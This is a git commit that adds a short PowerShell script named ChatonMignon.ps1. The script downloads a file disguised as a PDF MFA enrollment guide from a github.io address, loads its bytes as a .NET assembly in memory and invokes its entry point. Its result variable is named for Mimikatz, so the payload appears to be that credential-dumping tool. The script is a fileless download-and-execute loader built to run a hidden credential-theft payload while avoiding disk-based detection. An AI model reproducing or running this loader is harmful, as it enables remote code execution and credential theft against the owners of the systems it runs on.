dcc5438c1277148b103869f22e594aa3e2fc872b
HakkYahud <108320420+HakkYahud@users.noreply.github.com>
2024-07-26 05:14:33 -0400

    Add files via upload

---
+++ ChatonMignon.ps1
@@ -0,0 +1,15 @@
+﻿[String]$param = ""
+[String[]]$parameter = @(, $param)
+
+# Read the assembly from disk into a byte array
+$assemblyByte = (New-Object Net.WebClient).DownloadData("https://hakkyahud.github.io/MFA_Enrollment_Guide_for_users.pdf")
+#[Byte[]]$assemblyByte = [System.IO.File]::ReadAllBytes(".\explorer.exe")
+# Load the assembly
+$assembly = [System.Reflection.Assembly]::Load($assemblyByte)
+# Find the Entrypoint or "Main" method
+$entryPoint = $assembly.EntryPoint
+# Get Parameters
+$parameter_invoke = (, $parameter )
+
+# Invoke the method with the specified parameters
+$mimikatz = $entryPoint.Invoke($null, $null) # Wrap the inner aray in another array litteral expression
